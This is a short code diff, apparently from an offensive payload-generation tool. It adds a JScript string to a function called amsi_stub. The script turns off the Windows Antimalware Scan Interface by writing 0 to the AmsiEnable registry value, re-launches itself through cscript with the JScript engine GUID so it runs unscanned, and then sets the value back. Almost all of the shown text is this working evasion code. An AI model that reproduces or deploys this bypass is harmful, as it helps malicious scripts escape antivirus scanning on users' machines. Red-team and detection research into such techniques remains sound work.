@@ -2,6 +2,21 @@
 
 def amsi_stub(file_type, technique, filename):
 
+    # Slightly more elegant implementation of amsienable trick from @buffaloverflow
+    js_bypass_new = """\nvar sh = new ActiveXObject('WScript.Shell');
+var key = "HKCU\\\\Software\\\\Microsoft\\\\Windows Script\\\\Settings\\\\AmsiEnable";
+
+try{
+	var AmsiEnable = sh.RegRead(key);
+	if(AmsiEnable!=0){
+	throw new Error(1, '');
+	}
+}catch(e){
+	sh.RegWrite(key, 0, "REG_DWORD"); // neuter AMSI
+	sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName,0,1); // blocking call to Run()
+	sh.RegWrite(key, 1, "REG_DWORD"); // put it back
+	WScript.Quit(1);
+}\n\n"""
 
     js_bypass_1 = """\nvar regpath = "HKCU\\\\\Software\\\\Microsoft\\\\Windows Script\\\\Settings\\\\AmsiEnable";
 var exit=0;
